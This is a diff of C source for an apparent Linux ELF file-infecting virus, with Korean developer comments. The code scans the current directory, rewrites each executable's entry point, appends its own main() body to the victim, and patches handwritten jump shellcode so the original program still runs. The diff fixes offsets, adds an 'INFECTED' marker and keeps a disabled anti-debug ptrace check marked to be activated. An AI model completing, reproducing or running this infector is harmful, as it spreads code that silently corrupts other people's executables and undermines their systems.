@@ -17,9 +17,6 @@
 #define SPARE_FDS  (4) 
 #define MAX_FDS    (512)
 
-//6144
-
-
 struct linux_dirent {
    long           d_ino;
    off_t          d_off;
@@ -41,29 +38,30 @@ void listdir(const char *dirname,long long int startrip);
 void change_entrypoint(const char* ,long long int startrip);
 static inline long long int hereis();
 
-// 레지스터 컨텍스트를저장 
+// Save register context
 int main(int argc, char* argv[])
 {
-	
 	int startrip;
+	char infected[10] = {'I','N','F','E','C','T','E','D','\n',0};
+	my_write(1,infected,9);
 	
-	// 48 8d 05 00 00 00 00	lea    0x0(%rip),%rax 
+	//main의 시작RIP를 동적으로 구하기
 	asm("lea (%rip), %rax");
+	asm("lea (%%rax), %0":"=r"(startrip)); //  <main+84>
+	startrip = startrip - 84;
 	
-	// 8d 00	lea    (%rax),%eax
-	asm("lea (%%rax), %0":"=r"(startrip)); // main + 22 를 리턴함 --> 대상에 write()할때 main+22부터 copy되도록 하기
 	
-	startrip = startrip - 22; //main의 시작 주소
+	
 	// printf("main RIP is : 0x%x\n",startrip);
 	
-	
 	/*
+	// TODO : Activate it!
 	if(my_ptraceme(0,0,0,0)!=0) while(1);
 	*/
 	char dot[2]={'.',0};
     listdir(dot,startrip);
 	
-	// dummy instruction space for jmp instruction patch!!!
+	// Here is dummy instruction. Prepare space for instruction patch!!!
 	startrip = startrip + 1;
 	startrip = startrip - 1;
 	startrip = startrip + 1;
@@ -278,14 +276,12 @@ void change_entrypoint(const char* fpath,long long int startrip){
 	
 	filesize = ehdr.e_shoff + (ehdr.e_shentsize * (ehdr.e_shnum));
 	shellcodeloc = phdr.p_vaddr + filesize; 
-	
-	// Manipulate OEP (original entry point)
-	
 	oep = ehdr.e_entry;
-	ehdr.e_entry = shellcodeloc;
+	ehdr.e_entry = shellcodeloc; // Manipulate OEP (original entry point)
 	//printf("Original : 0x%x, Changed OEP : 0x%x\n",oep,shellcodeloc);
 	my_lseek(fd, 0, SEEK_SET);
 	my_write(fd, &ehdr, sizeof(ehdr));
+	
 	
 	
 	/*---------------------------------------------------------------------------*/
@@ -321,7 +317,11 @@ void change_entrypoint(const char* fpath,long long int startrip){
 	
 	my_write(fd,shellcode,10);
 	
+	
+	
+	
 	/*
+	// TODO : 이 루틴이 사라짐. 이거 복구하기. 이거는 프로그램 OEP에서 쓰는건데...  : main으로 들어감 -> 레지스터컨텍스트복구 -> 복구후 rdi가리키는값를 리턴주소에 더하기 -> 리턴주소에 점프 . 이런시긍로가도록하기.
 	  We use $RDI register to get relocation information. 
 	  $RDI holds base VA offset info!
 	  
@@ -333,16 +333,17 @@ void change_entrypoint(const char* fpath,long long int startrip){
 	  - If not :  
 	  *RDI  0x7ffff7ffe168 <— 0x0
 	*/
-		
+	
+	
 	
 	/* -----------Save original entry point-------------*/
 	// 이부분 없애버렸음. leave-ret 인지 ret 인지 모르는상황이기 때문에..
-	// 리턴주소는 main + ??? 에 jmp OEP 로 런타임패치하기로 하자.
+	// 리턴주소는 main + ??? 에 jmp OEP 로 런타임패치.
 	/*--------------------------------------------------*/
 	
-
 	
-	/* ---------- write ls [main()~~~hereis()] ---------*/
+	
+	/* ---------- write ls [main() ~~~ hereis()] ---------*/
 	my_lseek(fd, 0, SEEK_END);
 	endrip = hereis() + 10;
 	my_write(fd, startrip, endrip - startrip); 
@@ -350,7 +351,7 @@ void change_entrypoint(const char* fpath,long long int startrip){
 	
 	
 	
-	/* ------------- main 의 리턴주소를 런타임에 패치 ------------*/
+	/* ------------ main 의 리턴주소를 런타임에 패치 ------------*/
 	my_memset(shellcode,'\x90',0x1000);
 	
 	// OEP로 뛰기위한 레지스터 컨텍스트 복원
@@ -377,17 +378,23 @@ void change_entrypoint(const char* fpath,long long int startrip){
 	// OEP로 점프
 	/*  
 	     48 b8 41 41 41 41 41 41 41 41	movabs $0x4141414141414141,%rax  
+		 48 03 07	add    rax,QWORD PTR [rdi]  // rax 에 rdi 가 기리키는값 더하기
 	     ff e0	jmpq   *%rax   
 	*/
-	shellcode[9] = '\x48';
+	shellcode[9] =  '\x48';
 	shellcode[10] = '\xb8';
 	my_memcpy(&shellcode[11], &oep, sizeof(ehdr.e_entry));	
-	shellcode[19] = '\xff';
-	shellcode[20] = '\xe0';
+	
+	shellcode[19] = '\x48';
+	shellcode[20] = '\x03';
+	shellcode[21] = '\x07';
+	
+	shellcode[22] = '\xff';
+	shellcode[23] = '\xe0';
 	
 	
 	/*
-	메인전 컨텍스트저장
+	main 전 컨텍스트저장
 	50	push   %rax
     53	push   %rbx
     51	push   %rcx
@@ -397,41 +404,51 @@ void change_entrypoint(const char* fpath,long long int startrip){
     49 89 e7	mov    %rsp,%r15
 	90
 	
-	
-	메인은 이렇게 생겼음
-	00000000004004d6 <main>:
-	4004d6:	55                   	push   %rbp
-	4004d7:	48 89 e5             	mov    %rsp,%rbp
-	4004da:	48 83 ec 20          	sub    $0x20,%rsp
-	4004de:	89 7d ec             	mov    %edi,-0x14(%rbp)
-	4004e1:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
-	4004e5:	48 8d 05 00 00 00 00 	lea    0x0(%rip),%rax        # 4004ec <main+0x16>
-	4004ec:	8d 00                	lea    (%rax),%eax
-	4004ee:	89 45 fc             	mov    %eax,-0x4(%rbp)
-	4004f1:	83 6d fc 16          	subl   $0x16,-0x4(%rbp)
-	4004f5:	c6 45 f0 2e          	movb   $0x2e,-0x10(%rbp)
-	4004f9:	c6 45 f1 00          	movb   $0x0,-0xf(%rbp)
-	4004fd:	8b 45 fc             	mov    -0x4(%rbp),%eax
-	400500:	48 63 d0             	movslq %eax,%rdx
-	400503:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
-	400507:	48 89 d6             	mov    %rdx,%rsi
-	40050a:	48 89 c7             	mov    %rax,%rdi
-	40050d:	e8 ba 02 00 00       	callq  4007cc <listdir>
-	
-	// 여기서부터 패치 시작
-	400512:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
-	400516:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
-	40051a:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
-	40051e:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
-	400522:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
-	400526:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
-	40052a:	b8 00 00 00 00       	mov    $0x0,%eax
-	40052f:	c9                   	leaveq 
-	400530:	c3                   	retq   
+	msin 은 이렇게 생겼음 
+	<+0>:	55	push   %rbp
+	<+1>:	48 89 e5	mov    %rsp,%rbp
+	<+4>:	48 83 ec 30	sub    $0x30,%rsp
+	<+8>:	89 7d dc	mov    %edi,-0x24(%rbp)
+	<+11>:	48 89 75 d0	mov    %rsi,-0x30(%rbp)
+	<+15>:	c6 45 f0 49	movb   $0x49,-0x10(%rbp)
+	<+19>:	c6 45 f1 4e	movb   $0x4e,-0xf(%rbp)
+	<+23>:	c6 45 f2 46	movb   $0x46,-0xe(%rbp)
+	<+27>:	c6 45 f3 45	movb   $0x45,-0xd(%rbp)
+	<+31>:	c6 45 f4 43	movb   $0x43,-0xc(%rbp)
+	<+35>:	c6 45 f5 54	movb   $0x54,-0xb(%rbp)
+	<+39>:	c6 45 f6 45	movb   $0x45,-0xa(%rbp)
+	<+43>:	c6 45 f7 44	movb   $0x44,-0x9(%rbp)
+	<+47>:	c6 45 f8 0a	movb   $0xa,-0x8(%rbp)
+	<+51>:	c6 45 f9 00	movb   $0x0,-0x7(%rbp)
+	<+55>:	48 8d 45 f0	lea    -0x10(%rbp),%rax
+	<+59>:	ba 09 00 00 00	mov    $0x9,%edx
+	<+64>:	48 89 c6	mov    %rax,%rsi
+	<+67>:	bf 01 00 00 00	mov    $0x1,%edi
+	<+72>:	e8 e6 00 00 00	callq  0x400609 <my_write>
+	<+77>:	4c 8d 3d 00 00 00 00	lea    0x0(%rip),%r15        # 0x40052a <main+84>
+	<+84>:	41 8d 07	lea    (%r15),%eax
+	<+87>:	89 45 fc	mov    %eax,-0x4(%rbp)
+	<+90>:	83 6d fc 16	subl   $0x16,-0x4(%rbp)
+	<+94>:	c6 45 e0 2e	movb   $0x2e,-0x20(%rbp)
+	<+98>:	c6 45 e1 00	movb   $0x0,-0x1f(%rbp)
+	<+102>:	8b 45 fc	mov    -0x4(%rbp),%eax
+	<+105>:	48 63 d0	movslq %eax,%rdx
+	<+108>:	48 8d 45 e0	lea    -0x20(%rbp),%rax
+	<+112>:	48 89 d6	mov    %rdx,%rsi
+	<+115>:	48 89 c7	mov    %rax,%rdi
+	<+118>:	e8 ba 02 00 00	callq  0x40080b <listdir>
+	//------------여기서부터 패치 시작. 더미코드의시작--------------//
+	<+123>:	83 45 fc 01	addl   $0x1,-0x4(%rbp) 
+	<+127>:	83 6d fc 01	subl   $0x1,-0x4(%rbp)
+	<+131>:	83 45 fc 01	addl   $0x1,-0x4(%rbp)
+	<+135>:	83 6d fc 01	subl   $0x1,-0x4(%rbp)
+	<+139>:	83 45 fc 01	addl   $0x1,-0x4(%rbp)
+	<+143>:	83 6d fc 01	subl   $0x1,-0x4(%rbp)
+
 	*/
-	// virtual address가 아니라 실제로 shellcodeloc 이 파일시작으로부터 위치한거리. 따라서 base주소를 빼줘야 함. base는 어딨지? --> filesize!!
-	my_lseek(fd, filesize + 10 + 60, SEEK_SET); // 아아.. 파일사이즈(ls의끝)이 main이아니라 push..push... 이므로 이 길이도 계산해줘야함.
-	my_write(fd, shellcode, 30);
+	// virtual address가 아니라 실제로 shellcodeloc 이 파일시작으로부터 위치한거리. 
+	my_lseek(fd, filesize + 10 + 122, SEEK_SET); // 10(main 전 컨텍스트 저장 루틴의 길이) + 122(main의 시작으로부터 dummy까지의 길이) 
+	my_write(fd, shellcode, 24);
 	
 	/* ------------------------------------------------ */
 
